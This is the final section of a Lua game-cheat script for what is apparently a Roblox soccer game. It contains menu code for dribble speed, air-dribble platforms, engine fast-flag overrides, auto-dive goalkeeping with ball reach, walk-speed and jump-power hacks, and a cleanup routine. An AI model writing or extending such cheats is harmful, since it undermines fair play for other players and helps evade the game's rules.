    Name = "Dribble Speed",
    Default = dribbleSpeed,
    Min = 8,
    Max = 35,
    Flag = "dribblespeed",
    Callback = function(v) dribbleSpeed = v end
})

-- AIR DRIBBLE HELPER
local AirHelperSection = ExtrasTab:AddSection({ Name = "AIR DRIBBLE HELPER", Position = "Center" })

AirHelperSection:AddToggle({
    Name = "Enable Air Helper",
    Default = PlatformEnabled,
    Flag = "airhelper",
    Callback = function(v)
        PlatformEnabled = v
        if v then StartPlatformSystem() else StopPlatformSystem() end
    end
})

AirHelperSection:AddSlider({
    Name = "Platform Size",
    Default = PlatformSize,
    Min = 3,
    Max = 30,
    Flag = "platform_size",
    Callback = function(v)
        PlatformSize = v
        UpdatePlatformSize()
    end
})

AirHelperSection:AddSlider({
    Name = "Smoothness",
    Default = Smoothness * 100,
    Min = 0,
    Max = 100,
    Flag = "smoothness",
    Callback = function(v) Smoothness = v / 100 end
})

AirHelperSection:AddToggle({
    Name = "Show Platform",
    Default = ShowPlatform,
    Flag = "showplatform",
    Callback = function(v)
        ShowPlatform = v
        UpdatePlatformVisibility()
    end
})

AirHelperSection:AddSlider({
    Name = "Platform Visualizer",
    Default = PlatformTransparency * 100,
    Min = 0,
    Max = 100,
    Flag = "platform_vis",
    Callback = function(v)
        PlatformTransparency = v / 100
        UpdatePlatformVisibility()
    end
})

-- ============================================
--  TAB 9: FFLAGS
-- ============================================

local FFlagTab = Window:AddTab({ Name = "FFlags", Icon = "settings", Type = "Double" })

local FFlagSection = FFlagTab:AddSection({ Name = "FLAG MANAGER", Position = "Center" })

FFlagSection:AddInput({
    Name = "Target Time Delay (TT)",
    Placeholder = "13",
    Flag = "fflag_tt",
    Callback = function(v)
        if v and v ~= "" then
            pcall(function() sf("DFIntTargetTimeDelayFacctorTenths", v) end)
        end
    end
})

FFlagSection:AddInput({
    Name = "Interpolation Max Delay",
    Placeholder = "90",
    Flag = "fflag_interp",
    Callback = function(v)
        if v and v ~= "" then
            pcall(function() sf("FIntInterpolationMaxDelayMSec", v) end)
        end
    end
})

FFlagSection:AddInput({
    Name = "Physics Sender Rate",
    Placeholder = "60",
    Flag = "fflag_sender",
    Callback = function(v)
        if v and v ~= "" then
            pcall(function() sf("DFIntS2PhysicsSenderRate", v) end)
        end
    end
})

FFlagSection:AddInput({
    Name = "Target FPS",
    Placeholder = "9999",
    Flag = "fflag_fps",
    Callback = function(v)
        if v and v ~= "" then
            pcall(function() sf("DFIntTaskSchedulerTargetFps", v) end)
            if setfpscap then pcall(setfpscap, tonumber(v) or 60) end
        end
    end
})

FFlagSection:AddButton({
    Name = "Apply All Flags",
    Callback = function()
        pcall(function()
            sf("DFIntTargetTimeDelayFacctorTenths", "12")
            sf("FIntInterpolationMaxDelayMSec", "8")
            sf("DFIntS2PhysicsSenderRate", "90")
            sf("DFIntTaskSchedulerTargetFps", "9999")
            sf("FFlagTaskSchedulerLimitTargetFpsTo2402", "true")
            sf("FFlagDisablePostFx", "false")
        end)
    end
})

FFlagSection:AddButton({
    Name = "Reset Flags",
    Callback = function()
        pcall(function()
            sf("DFIntTargetTimeDelayFacctorTenths", "13")
            sf("FIntInterpolationMaxDelayMSec", "90")
            sf("DFIntS2PhysicsSenderRate", "60")
            sf("DFIntTaskSchedulerTargetFps", "60")
            sf("FFlagTaskSchedulerLimitTargetFpsTo2402", "false")
            sf("FFlagDisablePostFx", "false")
        end)
    end
})

-- ============================================
--  GK HEARTBEAT LOOP
-- ============================================

RunService.Heartbeat:Connect(function()
    if not gkAutoDiveEnabled then return end
    if not inBox() then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local ball = getMostDangerousBall()
    if not ball then return end
    
    local dist = (ball.Position - hrp.Position).Magnitude
    
    if dist < 4.5 and not touchCD then
        touchCD = true
        reachTouchAll()
        task.delay(0.08, function() touchCD = false end)
    end
    
    if not onCooldown and not animPlaying and dist <= HIT_RADIUS then
        doDive(ball)
    end
end)

-- ============================================
--  PING CACHE FOR PREDICTION
-- ============================================

RunService.Heartbeat:Connect(function()
    pcall(function()
        cachedPingGlobal = math.clamp(LocalPlayer:GetNetworkPing(), 0.008, 0.30)
    end)
end)

-- ============================================
--  WALKSPEED LOOP (FALLBACK)
-- ============================================

RunService.Heartbeat:Connect(function()
    if not WalkSpeedEnabled then return end
    pcall(function()
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then hum.WalkSpeed = WalkSpeedValue end
    end)
end)

-- ============================================
--  JUMP POWER LOOP (FALLBACK)
-- ============================================

RunService.Heartbeat:Connect(function()
    if not JumpPowerEnabled then return end
    pcall(function()
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then
            hum.UseJumpPower = true
            hum.JumpPower = JumpPowerValue
        end
    end)
end)

-- ============================================
--  CLEANUP
-- ============================================

RuntimeEnvironment.__SERENITY_HUB_CLEANUP = function()
    scriptAlive = false
    m1_enabled = false
    reachMethod2Enabled = false
    proxyEnabled = false
    CharacterReachEnabled = false
    PlatformEnabled = false
    WalkSpeedEnabled = false
    JumpPowerEnabled = false
    flyEnabled = false
    tpEnabled = false
    kickLoopEnabled = false
    dribbleEnabled = false
    gkAutoDiveEnabled = false
    predOn = false
    _reactActive = false
    _gkReactActive = false
    
    StopMethod1()
    StopMethod2()
    StopProxySystem()
    StopCharacterReachSystem()
    StopPlatformSystem()
    flyCleanup()
    if flyConn then flyConn:Disconnect(); flyConn = nil end
    if tpConn then tpConn:Disconnect(); tpConn = nil end
    if kickConnection then kickConnection:Disconnect(); kickConnection = nil end
    if dribbleConn then dribbleConn:Disconnect(); dribbleConn = nil end
    if predConn then predConn:Disconnect(); predConn = nil end
    if _reactThread then task.cancel(_reactThread); _reactThread = nil end
    if _gkReactThread then task.cancel(_gkReactThread); _gkReactThread = nil end
    stopAnim()
    
    cleanPredObjs()
    ClearAllPlatforms()
    StopWalkSpeedLoop(true)
    ResetJumpPower(LocalPlayer.Character)
    
    table.clear(ballParts)
    table.clear(ballVisualizers)
    table.clear(ballProxies)
    table.clear(reachOriginalProperties)
    table.clear(platforms)
    table.clear(predObjs)
    table.clear(originalColors)
    table.clear(originalSizes)
    table.clear(method2_trackedParts)
    
    DisconnectTrackedConnections()
end
